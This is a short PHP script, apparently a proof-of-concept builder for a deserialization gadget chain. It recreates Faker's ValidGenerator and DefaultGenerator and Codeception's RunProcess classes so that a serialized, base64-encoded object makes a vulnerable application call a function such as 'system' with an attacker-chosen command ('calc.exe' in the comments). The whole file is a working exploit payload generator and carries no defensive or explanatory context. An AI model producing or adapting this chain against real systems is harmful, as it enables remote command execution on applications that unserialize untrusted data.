<?php
/***
 * Created by joker
 * Date 2021/9/7 16:35
 ***/
namespace Faker;
class DefaultGenerator{
    protected $default;
    function __construct($parameter)
    {
        // $this->default = 'calc.exe';
        $this->default = $parameter;
    }
}
class ValidGenerator{
    protected $generator;
    protected $validator;
    protected $maxRetries;
    function __construct($function,$generator)
    {
        // $this->generator = new DefaultGenerator();
        $this->generator=$generator;
        $this->maxRetries = '10';
        // $this->validator = 'system';
        $this->validator = $function;
    }
}

namespace Codeception\Extension;
use Faker\ValidGenerator;
class RunProcess{
    private $processes;
    function __construct($ValidGenerator)
    {
        // $this->processes = [new ValidGenerator()];
        $this->processes = [$ValidGenerator];
    }
}
// echo base64_encode(serialize(new RunProcess()));